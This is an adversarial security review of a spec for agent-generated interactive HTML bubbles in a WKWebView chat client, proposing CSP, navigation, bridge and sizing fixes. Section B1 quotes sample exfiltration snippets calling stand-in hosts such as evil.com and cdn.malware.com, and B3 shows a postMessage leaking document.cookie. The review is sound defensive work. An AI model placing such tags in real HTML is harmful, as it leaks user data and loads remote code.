# Adversarial Review: Interactive HTML Bubbles Spec

## BLOCKERS (Must Fix Before Implementation)

### B1. No Content Security Policy (CSP) or Origin Isolation

The spec says "no network access" via WKWebViewConfiguration but this is **wrong**. WKWebView with `loadHTMLString(_:baseURL:)` or `loadData(_:mimeType:characterEncodingName:baseURL:)` **does allow network access** unless you:
1. Set a null/empty base URL (which breaks relative paths and some JS APIs)
2. Inject an extremely restrictive CSP via HTTP-equivalent meta tag
3. Use `WKContentRuleList` to block all requests

The spec has no CSP policy defined. An agent-crafted HTML payload can trivially:
- `<img src="https://evil.com/track?data=...">` for exfiltration
- `<iframe src="https://phishing.bank.com">` 
- `<script src="https://cdn.malware.com/payload.js">`
- `<link rel="stylesheet" href="https://...">`
- `fetch()` / `XMLHttpRequest` to arbitrary endpoints

**Required fix:** Define explicit CSP header injection (or `<meta http-equiv="Content-Security-Policy">` wrapping) with at minimum:
```
default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; font-src data:;
```

Consider `WKContentRuleList` as defense-in-depth.

### B2. No Base URL Security Model

The spec doesn't define what `baseURL` is passed to WKWebView's load methods. If you pass `nil`, some JS APIs fail. If you pass a `file://` URL, you risk:
- Local file access via `file://` XHR/fetch
- Cookie/storage leakage if any `file://` origin state exists
- iOS sandboxing bypass attempts

If you pass an `https://` origin, you risk:
- Credential leakage (cookies, storage) if that origin has any
- Universal link hijacking
- CORS bypass for that origin

**Required fix:** Define a synthetic origin like `clawline-bubble://<messageId>/` or use `about:blank` + CSP. Document the choice and its security implications.

### B3. No XSS Sanitization or Sandbox Enforcement

The spec says "arbitrary HTML/CSS/JS" from the agent. This is **maximally dangerous**:
- A compromised or malicious agent can execute arbitrary JS in WKWebView
- That JS has access to the `clawline` message handler
- That JS can exfiltrate via callbacks: `postMessage({action:"submit", data: document.cookie})` (if any cookies exist in the WKWebView context)
- That JS can phish the user with arbitrary UI

You state "No local storage / cookies" via `WKWebsiteDataStore.nonPersistent()`. This helps but:
- Non-persistent data store still allows session-scoped cookies/storage
- The spec doesn't mandate clearing between bubbles

**Required fix:** Either:
1. Define an allowlist of safe HTML/CSS elements and sanitize server-side before delivery, OR
2. Accept the risk but document it explicitly with threat model, OR
3. Render in a separate WKWebView process pool per bubble to isolate crashes/exploits

### B4. Navigation Policy is Underspecified

The spec says "Links open in Safari via `decidePolicyFor navigationAction`". But:
- What about `window.open()`, `target="_blank"`, meta refresh, location.href redirects?
- What about `javascript:` URLs?
- What about `data:` URLs?
- What about `blob:` URLs?

The existing `LinkPreviewView` has some of this (line 717-773), but the spec doesn't define the complete policy.

**Required fix:** Define the complete navigation policy:
- Block all navigations except initial load
- Block `window.open()` via WKUIDelegate `createWebViewWith`
- Block `javascript:`, `data:`, `blob:` schemes
- Block meta refresh via `WKContentRuleList` or by stripping in HTML preprocessing

### B5. JS<->Native Bridge Attack Surface

The `clawline` message handler is a direct conduit from untrusted JS to your native code. Security concerns:
- What validates the `action` and `data` fields?
- Can an attacker send malformed data that crashes the native handler?
- Can they send huge payloads to DoS the WS?
- Can they spam callbacks to flood the agent?

**Required fix:** Define:
- Maximum payload size for callbacks (e.g., 64KB)
- Maximum callbacks per bubble per second (rate limit)
- Schema validation for `action` (string, max length) and `data` (max depth, max size)
- Error handling when validation fails

## MAJOR ISSUES (High-Risk Gaps)

### M1. No Callback Ordering/Delivery Guarantees

The spec says callbacks go over the existing WebSocket but doesn't define:
- **Ordering:** Are callbacks delivered in order per bubble? Across bubbles?
- **Idempotency:** If the WS reconnects, are callbacks replayed? Deduplicated?
- **Timeouts:** What if the WS is down? Does the callback queue? Retry? Fail silently?
- **Acknowledgement:** Does the client get confirmation the callback was delivered?

This matters because:
- Form submission that appears to succeed but wasn't delivered = data loss
- Double-submit on retry = duplicated actions

**Recommendation:** Add a callback acknowledgement protocol:
```json
// Client -> Provider
{"type": "interactive-callback", "callbackId": "uuid", "messageId": "...", "payload": {...}}

// Provider -> Client (optional ack)
{"type": "interactive-callback-ack", "callbackId": "uuid", "status": "delivered|failed"}
```

Define retry semantics: N retries, exponential backoff, then surface error to user.

### M2. Callback Delivery Format is Unresolved

"Option A, B, or C... leaning toward C" is not a spec. This is a fundamental protocol decision that affects:
- Agent implementation complexity
- Backwards compatibility when you change it later
- Whether callbacks are visible in chat history

**Recommendation:** Pick Option C, define the exact schema, and include a `version` field for future evolution.

### M3. Sizing Strategy Ignores Known Hard Problems

The spec says "WKWebView reports `document.body.scrollHeight` after load" but `LinkPreviewView` (lines 535-583) shows this is a ~100-line problem with:
- `scrollHeight` reporting viewport height for small content
- Need to walk text nodes and measure `getBoundingClientRect()`
- ResizeObserver-based updates that can jitter
- Debouncing and height locking to prevent loops

The spec's single sentence handwaves the hardest part of implementation. Given your history with T020/T026/T028 (which I couldn't find, but the bubble-sizing-v2 spec references them extensively), this is concerning.

**Recommendation:** Either:
1. Reference bubble-sizing-v2 explicitly and require interactive bubbles to integrate with `BubbleLayoutPlan`/`BubbleMeasurement`, OR
2. Spec out the sizing protocol in detail, including:
   - Initial height estimation
   - Height change notification mechanism (JS -> native)
   - Debounce/coalesce strategy
   - Max height changes before locking
   - Integration with flow layout cache invalidation

### M4. No Process Crash Recovery

WKWebView runs content in a separate process that can crash (memory pressure, JS bugs, WebKit bugs). The spec doesn't address:
- How does the bubble render after `webViewWebContentProcessDidTerminate:`?
- Can the user reload?
- Does it show an error state?
- Is there crash logging?

**Recommendation:** Add error states:
- "Content crashed. [Reload]"
- Log crash to observability
- Consider auto-reload once, then show error

### M5. No Memory/Performance Bounds

Each WKWebView is ~2-3MB minimum. If the user scrolls through 50 interactive bubbles:
- 50 * 3MB = 150MB just for web views
- Plus process overhead

The spec says nothing about:
- Cell reuse / WKWebView recycling
- Maximum concurrent loaded web views
- Offscreen eviction policy
- Memory warning handling

`LinkPreviewView` has some of this (line 128-145) but the spec should define the policy.

**Recommendation:** Define:
- WKWebView pooling/reuse strategy
- Max concurrent loaded bubbles (e.g., visible + 2 offscreen each direction)
- Memory warning eviction (similar to LinkPreviewView's approach)

### M6. Bubble Immutability is Unresolved

Open Question #3 says "Can a bubble be 'updated'?" This is critical for:
- Multi-step forms (wizard flows)
- Live-updating content (progress bars)
- Correcting agent mistakes

If immutable: simpler, but less powerful.
If mutable: need to define update delivery, state migration, user expectations when content changes under them.

**Recommendation:** Start with immutable bubbles. If update is needed, define a new message type `interactive-html-update` with explicit `messageId` targeting and versioning.

## SECONDARY ISSUES

### S1. visionOS Considerations are an Open Question

The spec punts on visionOS (Open Question #4). This is risky because:
- visionOS WKWebView may behave differently (RealityKit compositing)
- Touch input mapping in spatial context
- Ornament/window sizing expectations

**Recommendation:** File a separate visionOS spike or mark this as iOS-only for v1.

### S2. Accessibility is Handwaved

"VoiceOver reads HTML" is not accessibility. Interactive bubbles need:
- Proper rotor navigation
- Form field labels
- Submission feedback announcements
- Escape hatch if WebView traps focus

**Recommendation:** Define minimum accessibility requirements for agent HTML and add client-side safeguards (focus trap detection, aria-live announcements for callbacks).

### S3. No Versioning or Backwards Compatibility Story

The content type `application/vnd.clawline.interactive-html+json` has no version. When you inevitably change:
- Metadata schema
- Bridge API
- Callback format

...old clients will break.

**Recommendation:** Add `version` field to payload and define forward-compatibility rules.

### S4. No Test Plan

The spec has no test plan. Given the security surface area, this is negligent.

**Recommendation:** Add:
- Unit tests: payload validation, CSP injection, navigation blocking
- Integration tests: callback round-trip, sizing measurement, error states
- Security tests: XSS attempts, exfiltration attempts, navigation bypass attempts
- Performance tests: 50 bubbles, memory under pressure
- Snapshot tests: theming, error states, loading states

### S5. Logging/Observability is Missing

The spec says nothing about:
- Logging JS errors from the WebView
- Tracking callback latency
- Metrics on bubble render success/failure

**Recommendation:** Define logging hooks:
- JS errors via `WKNavigationDelegate` error callbacks
- Callback send/ack latency
- Render state machine transitions

### S6. Content Size Limit is Suggestion, Not Requirement

"Suggestion: 256KB max" is not a spec. 256KB is also quite large for inline HTML.

**Recommendation:** Make it a hard limit, enforced at:
- Provider: reject messages > 256KB
- Client: truncate/reject if somehow larger

### S7. No Theming Fallback

What if the agent ignores CSS variables and hardcodes colors? The bubble might look broken in light mode.

**Recommendation:** Consider a wrapper `<div>` with theme-aware fallback styles, or accept the risk and document it.

## MISSING ITEMS

1. **Schema definitions:** JSON schema for payload, callback, ack
2. **Error codes:** What errors can occur and how are they surfaced?
3. **Reserved action namespace:** What if agent uses `_foo` accidentally?
4. **Universal links:** If the HTML contains an app link, does it get intercepted?
5. **Pasteboard access:** Can JS read/write clipboard? (Probably not without user gesture, but should be explicit)
6. **Camera/mic:** Spec says deny in WKUIDelegate, but this should be in spec text
7. **Popups:** What happens if JS calls `alert()`, `confirm()`, `prompt()`? Spec says suppress, but how?
8. **Form autocomplete:** Does iOS offer to save passwords from these forms?
9. **WebSocket in WebView:** Can JS open its own WebSocket connection?
